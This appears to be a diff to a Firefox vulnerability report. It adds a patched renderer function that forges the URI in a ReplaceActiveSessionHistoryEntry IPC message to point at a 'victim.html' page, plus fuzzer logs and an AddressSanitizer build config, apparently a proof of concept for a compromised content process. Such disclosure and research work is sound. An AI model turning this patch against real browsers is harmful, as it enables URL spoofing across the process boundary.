@@ -16,3 +16,73 @@ logs:
 [Child 1530782: Main Thread]: I/my_ipc_logger IPCFuzzer: ::mozilla::ipc::StandardURLParams spec, replaced url: http://127.0.0.2:8080/victim.html#32154352
 [time: 1716296577380009][1530782->1530557] [PContentChild] Sending  PContent::Msg_ReplaceActiveSessionHistoryEntry
 ```
+
+## Renderer Patch
+
+```cpp
+// release/ipc/ipdl/PContentChild.cpp
+
+auto PContentChild::SendReplaceActiveSessionHistoryEntry(
+        const MaybeDiscardedBrowsingContext& context,
+        const SessionHistoryInfo& info) -> bool
+{
+    UniquePtr<IPC::Message> msg__ = PContent::Msg_ReplaceActiveSessionHistoryEntry(MSG_ROUTING_CONTROL);
+    IPC::MessageWriter writer__{
+            (*(msg__)),
+            this};
+
+    // PATCH
+    SessionHistoryInfo newInfo(info);
+    nsCOMPtr<nsIURI> uri;
+    nsresult rv = NS_NewURI(getter_AddRefs(uri), "http://127.0.0.2:8080/victim.html"_ns);
+    newInfo.SetURI(uri);
+
+    IPC::WriteParam((&(writer__)), context);
+    // Sentinel = 'context'
+    ((&(writer__)))->WriteSentinel(199164678);
+    IPC::WriteParam((&(writer__)), newInfo);
+    // Sentinel = 'info'
+    ((&(writer__)))->WriteSentinel(70058413);
+
+    if (mozilla::ipc::LoggingEnabledFor("PContent", mozilla::ipc::ChildSide)) {
+        mozilla::ipc::LogMessageForProtocol(
+            "PContentChild",
+            this->ToplevelProtocol()->OtherPidMaybeInvalid(),
+            "Sending ",
+            msg__->type(),
+            mozilla::ipc::MessageDirection::eSending);
+    }
+    AUTO_PROFILER_LABEL("PContent::Msg_ReplaceActiveSessionHistoryEntry", OTHER);
+
+    bool sendok__ = ChannelSend(std::move(msg__));
+    return sendok__;
+}
+```
+
+mozconfig:
+```
+export MOZ_PACKAGE_JSSHELL=1
+
+ac_add_options --with-app-name=firefox
+mk_add_options MOZ_APP_NAME=firefox
+mk_add_options MOZ_OBJDIR=@TOPSRCDIR@/release
+
+# Enable ASan specific code and build workarounds
+ac_add_options --enable-address-sanitizer
+
+# These three are required by ASan
+ac_add_options --disable-jemalloc
+ac_add_options --disable-crashreporter
+ac_add_options --disable-elf-hack
+
+# Keep symbols to symbolize ASan traces later
+export MOZ_DEBUG_SYMBOLS=1
+ac_add_options --enable-debug-symbols
+ac_add_options --disable-install-strip
+
+# Settings for an opt build (preferred)
+# The -gline-tables-only ensures that all the necessary debug information for ASan
+# is present, but the rest is stripped so the resulting binaries are smaller.
+ac_add_options --enable-optimize="-O2 -gline-tables-only"
+ac_add_options --disable-debug
+```
